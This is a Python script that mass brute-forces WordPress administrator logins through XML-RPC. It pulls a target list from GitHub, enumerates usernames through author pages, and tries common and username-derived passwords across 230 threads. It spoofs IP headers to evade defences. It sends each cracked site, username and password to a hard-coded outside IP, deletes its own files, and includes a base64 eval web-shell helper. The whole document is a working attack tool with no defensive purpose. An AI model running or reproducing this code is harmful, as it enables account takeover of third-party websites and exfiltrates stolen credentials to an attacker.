import urllib
import re
import urllib2
import sys
import base64

# !/usr/bin/python
# coding=utf-8
import urllib2
import urllib
import time
import cookielib, sys
import os,sys
import threading
import Queue
import random
q=Queue.Queue()

passlist=['123456','000000','00000000','111111','11111111','111111111','1111111111','112233','11223344','123!@#','123$%^','123123','123123123','123321','1234','12345','1234567','12345678','123456789','1234567890','123qwe','147258369','1qaz2wsx','222222','333333','444444','54321','555555','654321','666666','66666666','7654321','777777','789456123','87654321','888888','88888888','987654321','999999','Admin','Admin1','Admin12','Admin123','Admin1234','Admin12345','Admin123456','Admin1234567','Admin12345678','Admin123456789','Angel','Pass','Pass123','Pass123456','Passwd','Password','a123456','a1234567','a123456789','a1b2c3','aaaaaaaa','abc123','abcabc','abcdef','admin','admin1','admin12','admin123','admin1234','admin12345','admin123456','admin1234567','admin12345678','admin123456789','admin888','angel','asd123','asdf1234','baseball','dragon','football','fuckyou','iloveyou','kissme','letmein','login','master','monkey','p@ssw0rd','p@ssword','pass','pass123','pass123456','passw0rd','passwd','password','princess','qazwsx','qti7Zxh18U','qwe123','qweasd','qwer1234','qwerty','qwertyui','qwertyuiop','root','root123','starwars','superman','system','test','test123','test123456','testtest','trustno1','web123','welcome','wordpress','www123']



f = urllib2.urlopen( 'https://raw.githubusercontent.com/dorgens/FREE583C0/master/all1.txt')
with open('all1.txt', 'wb') as code:
    code.write(f.read())
numurl = urllib2.Request('http://45.77.60.207/wp/num.php')
resurl_data = urllib2.urlopen(numurl)
lines=open('all1.txt','r')
for line in lines:
    line=line.rstrip()
    q.put(line)

ip_list=['127.0.0.1','8.8.8.8','8.8.4.4','202.12.27.33','202.27.184.3','12.127.16.67','12.127.17.71','12.166.30.2','12.17.136.131','12.180.165.40','12.25.232.115','12.32.34.33','12.49.240.68','128.8.10.90','128.9.0.107','164.124.101.31','165.87.13.129','165.87.201.244','168.126.63.60','168.126.63.61','168.95.192.1','192.112.36.4','192.203.230.10','192.33.4.12','192.36.148.17','192.5.5.241','192.58.128.30','192.9.9.3','193.0.14.129','198.32.64.12','198.41.0.4','203.248.240.31','205.171.2.65','205.171.3.65','208.67.220.220','208.67.222.222','208.96.10.221','209.166.160.132','209.166.160.36','24.154.1.4','24.159.64.23','24.177.176.38','24.178.162.3','24.197.96.16','24.237.132.5','66.33.206.206','66.33.216.216']
header = {"referer":"http://www.google.com.hk",
          "User-Agent":"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.90 Safari/537.36",
          "X-Forwarded-For":"8.8.8.8"
          }
del_paths = [name for name in os.listdir('.') if name.endswith('.py') or name.endswith('.pyc')]
for del_path in del_paths:
    os.remove(del_path)

def scaner():
    while not q.empty():
        arrayqueue = Queue.Queue(maxsize=40)
        while not arrayqueue.full():
            try:
                j=q.get()
                arrayqueue.put(j)
                if q.empty():
                    break
                if arrayqueue.full():
                    print "di yi ge dui le man le alll!!!!!!1111111AAAABBBBBBBB"
            except:
                pass
        while not arrayqueue.empty():
            i = arrayqueue.get()
            site= "".join(i)
            site= "http://" + site.replace('http://', '').replace('https://', '') + "/"
            try:
                print "test url :"+site
                userflag = 0
                for i in range(1,5):
                    #print get_usernamelist(site, str(i))
                    thisuser = get_usernamelist(site, str(i))
                    if userflag>5:
                        break
                    #print thisuser
                    #wx("urluser.txt",site+"----"+thisuser+"\n")
                    urlpasslists = urlpass(site)
                    if thisuser != None:
                        userflag = userflag + 1
                      #  print site + "this user is" + thisuser + "okokok"
                        userpassword2 = get_passwordlist(thisuser)
                        p = Queue.Queue()
                        tempnum = ''
                        # temreq=requests.post(site+"/xmlrpc.php", data=data % ("123", "123456".rstrip("\n")))
                        # domianpass1, domainpass2, domainpass3 = site.split('.', 2)
                        # passlist.append(domainpass2, domainpass2 + domainpass3)
                        # print 'This ********------->>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>list num is '+len(passlist)
                        # print domainpass2,domainpass2+domainpass3
                        for passwordlist in passlist:
                            p.put(passwordlist)
                            # print "test pass1 --" + site + " username:" + thisuser + " password:" + passwordlist
                        for userpasswordlist in userpassword2:
                            p.put(userpasswordlist)
                            # print "test pass2 --" + site + " username:" + thisuser + " password:" + userpasswordlist
                        for urlpasslist in urlpasslists:
                            p.put(urlpasslist)
                            # print(urlpasslist+"               TTTTTTTTTTTTTTTTTTThis url pass is")
                            p.put(thisuser + urlpasslist)
                            if tempnum != '':
                                p.put(tempnum + urlpasslist)

                            tempnum = urlpasslist + '.'
                        burpnum = 0
                        cishu = 0
                        passarray = []
                        while not p.empty():
                            passarray.append(p.get())
                        for ppass in passarray:
                            #print "test pass --" + site + " username:" + thisuser + " password:" + ppass
                            if str(xmlcrak(site, thisuser, ppass))=='1':

                                break
                            time.sleep(random.randint(7,9))

            except:
                pass



def urlpass(url):

    urlpasslist=url.replace('http://','').replace('www.','').replace('/','').split('.')
    return urlpasslist


def get_passwordlist(username):
    passwordlist = []
    fuzz_list = ['',username,username+username,'good','!','!!!','!@#','!@#$','!@#$%','!@#$%^','!@#123','!@#456','#','##','###','#@!','*','**','***','.','..','...','0','000','000000','1','10','11','111','111111','12','123','1234','12345','123456','1234567','12345678','123456789','123abc','13','14','15','16','17','18','19','1980','1981','1982','1983','1984','1985','1986','1987','1988','1989','1990','1991','1992','1993','1994','1995','1996','1997','1998','1999','2','20','2000','2001','2002','2003','2004','2005','2006','2007','2008','2009','2010','2011','2012','2013','2014','2015','2016','2017','2018','2019','21','22','222','222222','23','24','25','26','27','28','29','3','30','31','32','321','33','333','333333','34','35','36','37','38','39','4','40','41','42','43','44','444','444444','45','46','47','48','49','5','50','51','52','53','54','55','555','555555','56','57','58','59','6','60','61','62','63','64','65','654321','66','666','666666','67','68','69','696969','7','70','71','72','73','74','75','76','77','777','777777','78','789','79','8','80','81','82','83','84','85','86','87','88','888','888888','9','99','999','999999','@','@123','@123.com','@1988','@1989','@1990','@2008','@2009','@2010','@2011','@2012','@2013','@2014','@2015','@2016','@@','@@@','@abc','@xyz','ABC','FuckFuck','Hi','I','OK','_','a','ab','abab','abc','abc123','abcabc','abcd','abcdefj','acac','ad','admin','af','asd123','b','baseball','bc','c','dragon','football','fuck','fuckyou','good','harley','hello','hi','idc','in','is','jennifer','jordan','letmein','log','login','love','master','michael','monkey','mustang','mygod','ok','password','pussy','qwe123','qwerty','shadow','superman','test','test123','testin','testinblog','testincn','testtest','thankyou','that','this','user','what','xxx','xyx','you','zxc123']
    for i in fuzz_list:
        passwordlist.append(username+i)
    return passwordlist


def xmlcrak(site,thisuser,ppass):
    try:
        data = """<?xml version="1.0" encoding="UTF-8"?><methodCall><methodName>wp.getUsersBlogs</methodName><params><param><value>%s</value></param><param><value>%s</value></param></params></methodCall>"""
        data =data % (thisuser, ppass.rstrip("\n"))
        #print data
        url=site + "/xmlrpc.php"

        req=post(url,data)
        #print req
        if 'isAdmin' in req:
            dataurls = "http://45.77.60.207/wp/num.php?name=pytestokpy700test2.txt&data=" + site + "/wp-login.php," + thisuser + "," + ppass
            reqdatas = urllib2.Request(dataurls)
            res_datas = urllib2.urlopen(reqdatas)
            print site + " [+] username = " + thisuser + " password = " + ppass
            dataurls1="http://45.77.60.207/wp/num.php?name=pytestokpyv2v700test2yanshijianyin5testkkkk.txt&data=" + site + "/wp-login.php," + thisuser +"," + ppass
            reqdatas1 = urllib2.Request(dataurls1)
            res_datas1 = urllib2.urlopen(reqdatas1)
            return 1

        if '403' in req.text:
            time.sleep(random.randint(1,5))
            return 2
        else:
            return 1

    except:
        pass
    return 0







def post(url, data):
    #print url
    req = urllib2.Request(url)
    #data = urllib.urlencode(data)
    opener = urllib2.build_opener(urllib2.HTTPCookieProcessor())
    response = opener.open(req, data)
    return response.read()

def get_usernamelist(url,author_id):

    try:
        xff3 = '%d.%d.%d.%d' % (random.randint(2, 254),
                                 random.randint(2, 254),
                                 random.randint(2, 254),
                                 random.randint(2, 254))
        header3 = {"referer": "http://www.google.com.hk",
                   "User-Agent": "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.90 Safari/537.36",
                   "X-Forwarded-For": xff3
                   }
        #url_parse = urlparse.urlparse(url)
        #domain = url_parse.scheme+"://"+url_parse.netloc
        url = url+"/?author=%s"%author_id
        #print url
        req = urllib2.Request(url)
        res_data = urllib2.urlopen(req)
        res = res_data.read()
        h = re.search(r'author-(\S+) author-', str(res))
        author = h.group(1)
        return author
    except:
        pass

def get_usernamelist1111(site,author_id):
    _cun = 1
    Flag = True

    __Check2 = requests.get(url= site + '/?author='+author_id, timeout=60)
    try:
        while Flag:
            GG = requests.get(url=site + '/wp-json/wp/v2/users/' + author_id, timeout=55)
            __InFo = json.loads(GG.text)
            if 'id' not in __InFo:
                Flag = False
            else:
                Usernamez = __InFo['name']
                return Usernamez
            break
    except:
        try:
            if '/author/' not in __Check2.text:
                return None
            else:
                find = re.findall('/author/(.*)/"', __Check2.text)
                username = find[0]
                h = re.search(r'author-(\S+) author-', __Check2.text)
                if h != None:
                    username2 = h.group(1)
                    return username2
                else:
                    return username
        except requests.exceptions.ReadTimeout:
            return None




def get_shell_path(posturl,passwd):
    shell_path = ""
    try:
        data = {}
        data[passwd] = '@eval(base64_decode($_POST[z0]));'
        data['z0']='ZWNobyAkX1NFUlZFUlsnU0NSSVBUX0ZJTEVOQU1FJ107'
        shell_path = post(posturl, data).strip()
    except Exception:
        pass
    return shell_path

def wx(filename,context):
    f= file(filename,"a+")#write sucess word
    f.write(context)
    f.close()

if __name__ == '__main__':
    thread_num=230
    time.sleep(random.randint(2, 5))

    for i in range(int(thread_num)):
        t = threading.Thread(target=scaner)
        t.start()
    del_paths = [name for name in os.listdir('.') if name.endswith('.txt') or name.endswith('.py')]
    for del_path in del_paths:
        os.remove(del_path)
